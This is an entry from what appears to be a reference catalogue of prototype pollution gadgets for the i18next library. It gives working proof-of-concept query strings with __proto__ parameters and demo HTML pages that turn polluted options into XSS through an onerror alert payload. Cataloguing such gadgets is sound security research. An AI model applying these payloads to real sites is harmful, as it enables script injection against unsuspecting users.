## i18next

### URL

https://www.i18next.com/

### JS Fingerprint

```js
return (typeof i18next !== 'undefined')
```

### Vulnerable code fragment

https://github.com/i18next/i18next/blob/ff587340dc39c2ddc8871c02e91ba5b2a8dca1bd/src/Translator.js#L99

### PoC

In this case, XSS is not performed directly. Depends on where the translated string is used.

#### i18next, Replacing all translations with namespace<xss>key

```
?__proto__[lng]=cimode&__proto__[appendNamespaceToCIMode]=x&__proto__[nsSeparator]=<img/src/onerror%3dalert(1)>
```

```html
<div id="output"/>
<script src="https://cdnjs.cloudflare.com/ajax/libs/i18next/20.2.1/i18next.min.js"></script>
<script>
    Object.prototype.lng='cimode'
    Object.prototype.appendNamespaceToCIMode='x'
    Object.prototype.nsSeparator='<img/src/onerror=alert(1)>'
</script>
<script>
i18next.init({
    fallbackLng: 'en',
  resources: {
    en: {
      translation: {
        "key": "hello world"
      }
    }
  }
}, function(err, t) {
  document.getElementById('output').innerHTML = i18next.t('key');
});
</script>
```

#### i18next < 19.8.5, Replacing all translations

```
?__proto__[lng]=a&__proto__[a]=b&__proto__[obj]=c&__proto__[k]=d&__proto__[d]=<img/src/onerror%3dalert(1)>
```

```html
<div id="output"/>
<script src="https://cdnjs.cloudflare.com/ajax/libs/i18next/19.8.4/i18next.min.js"></script>
<script>
    Object.prototype.lng='a'
    Object.prototype.a='b'
    Object.prototype.obj='c'
    Object.prototype.k='d'
    Object.prototype.d='<img/src/onerror=alert(1)>'
</script>
<script>
i18next.init({
    fallbackLng: 'en',
  resources: {
    en: {
      translation: {
        "key": "hello world"
      }
    }
  }
}, function(err, t) {
  document.getElementById('output').innerHTML = i18next.t('key');
});
</script>
```

#### i18next >= 19.8.5, Replacing {{key}} translation

```
?__proto__[lng]=a&__proto__[key]=<img/src/onerror%3dalert(1)>
```

```html
<div id="output"/>
<script src="https://cdnjs.cloudflare.com/ajax/libs/i18next/19.8.5/i18next.min.js"></script>
<script>
    Object.prototype.lng='a'
    Object.prototype.key='<img/src/onerror=alert(1)>'
</script>
<script>
i18next.init({
    fallbackLng: 'en',
  resources: {
    en: {
      translation: {
        "key": "hello world"
      }
    }
  }
}, function(err, t) {
  document.getElementById('output').innerHTML = i18next.t('key');
});
</script>
```